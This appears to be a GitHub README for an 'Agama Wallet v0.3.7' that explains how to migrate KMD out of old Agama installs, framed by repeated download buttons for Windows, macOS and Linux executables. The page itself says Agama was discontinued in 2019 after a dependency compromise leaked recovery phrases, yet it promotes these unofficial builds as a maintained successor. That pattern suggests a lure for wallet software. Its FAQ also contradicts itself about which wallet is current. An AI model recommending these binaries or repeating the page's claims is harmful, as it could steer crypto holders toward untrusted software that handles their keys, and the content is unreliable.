[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Moving KMD Out of an Old Agama Wallet

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Moving KMD out of an old Agama install means restoring the wallet's keys in software that still works, then sending the balance to an address you control in a current wallet. The old application does not need to run for this: the phrase or wallet file is what carries access. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and the Komodo-era Agama it descends from was discontinued on 2019-06-07.

## You'll see this if

You have an old install, a backup file or a written phrase, and the software that created it either will not start or should not be trusted with funds.

| What you have | Route | What to expect |
|---|---|---|
| Working old install | Send directly to a current wallet | Simplest, if the old build still syncs and sends |
| Phrase only | Restore into current software | Address range and derivation decide what appears |
| Wallet file only | Restore into software that reads that format | Format compatibility is the constraint |
| Nothing | No route | Nothing can recover the funds |

## Why it happens

Old wallets become liabilities for two reasons. The software stops receiving fixes, and the environment it runs in moves on: operating system versions, dependencies, network endpoints. A wallet that cannot sync cannot send, whatever its keys still control.

The keys, however, do not expire. KMD sits on addresses derived from the phrase, and any software that derives the same addresses can spend it. Migration is therefore a software problem, not a blockchain one.

One caution belongs here rather than in a footnote: the 2019 incident involved recovery material leaving a wallet through a compromised dependency. If that phrase ever lived in a build from that period, treat it as exposed and move the funds to a freshly generated wallet rather than reusing it.

## Fix

Migrate in this order, and do not skip the verification step.

1. **Back up before touching anything.** Phrase written offline, wallet file copied if available; [backing up an Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/backup-what-dat-covers.md) covers both.
2. **If the old install still runs, check whether it can send.** A synced wallet can move funds directly, which is the shortest path.
3. **If it cannot, restore into working software** using the phrase, and wait for the scan to finish.
4. **Verify the balance against a known address** before sending anything. A partial balance means the scan is incomplete, not that funds are missing.
5. **Send to a wallet you control**, on the KMD chain, and confirm the address format before broadcasting.
6. **Send a small test first** if the amount justifies it, then the remainder.
7. **Generate a new phrase for the destination** if the old one was ever in a compromised build.

If nothing appears after restoring, [zero balance after restoring](https://github.com/agama-wallet/agama-wallet/blob/main/zero-balance-after-restore.md) is the next step, not a second restore.

## If that did not work

If the old wallet will not sync, do not keep trying: the network endpoints it expects may no longer exist. Restore elsewhere.

If the phrase restores an empty wallet, derivation or scan range is the cause, and a wallet that lets you widen the range is the answer.

If the wallet file will not open, the format is not readable by the software you have. The phrase is the portable route, and it may not exist if the wallet never generated one.

If someone offers to migrate the funds for a fee, they are asking for your phrase. There is no service that can move KMD without it.

## Prevention

- **Migrate before the old software stops working.** Waiting converts a simple send into a derivation puzzle.
- **Do not reuse a phrase from a 2019-era build.** New wallet, new phrase.
- **Keep the destination wallet current.** [Komodo Wallet and KMD](https://github.com/agama-wallet/agama-wallet/blob/main/komodo-and-kmd.md) covers which wallet the ecosystem runs now.
- **Record the transaction before you close the old wallet.** A transaction hash is proof the send happened, and the only record that survives a wiped device.
- **Never share the phrase with a helper.** [Why a seed phrase fails](https://github.com/agama-wallet/agama-wallet/blob/main/why-a-seed-phrase-fails.md) covers the failure modes without one.

## FAQ

### Do I need the old Agama app to move my KMD?

No. The phrase or wallet file is what carries access. The application was only a tool for using those keys.

### Which wallet should receive the KMD?

One you control and that is maintained for the KMD chain. The ecosystem's current wallet is Gleec Exchange Wallet; the destination matters less than the fact that you hold its keys.

### Can I move KMD without paying a fee?

No. Moving value on a UTXO chain is a transaction, and transactions pay a network fee in KMD.

### How long does a migration take?

The restore is quick; the scan depends on the chain and the range. A send confirms in the chain's normal block time. Budget an hour for the whole exercise rather than five minutes, and do not rush the verification step.

### Can I migrate without a working computer?

Not practically. A restore needs software and a network connection, and a send needs a signed transaction. A phone wallet is a legitimate destination, provided its distribution is verified rather than an unverified file.

### Is it worth migrating a very small balance?

The fee decides that. If the amount is smaller than the fee to move it, the balance is uneconomic to migrate and can be left where it is.

### What if the old wallet shows a balance the new one does not?

The new wallet is scanning a different address range. Widen it or use software with a broader scan; the chain has not changed.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [Is Agama Wallet Discontinued? Two Products, One Name](https://github.com/agama-wallet/agama-wallet/blob/main/two-products-one-name.md)
- [Restoring an Agama Wallet: Seed, Passphrase and Wallet File](https://github.com/agama-wallet/agama-wallet/blob/main/restore-from-seed-phrase.md)
- [Agama Wallet Backup: What wallet.dat Covers](https://github.com/agama-wallet/agama-wallet/blob/main/backup-what-dat-covers.md)
- [Komodo Wallet: What It Is and How KMD Works](https://github.com/agama-wallet/agama-wallet/blob/main/komodo-and-kmd.md)
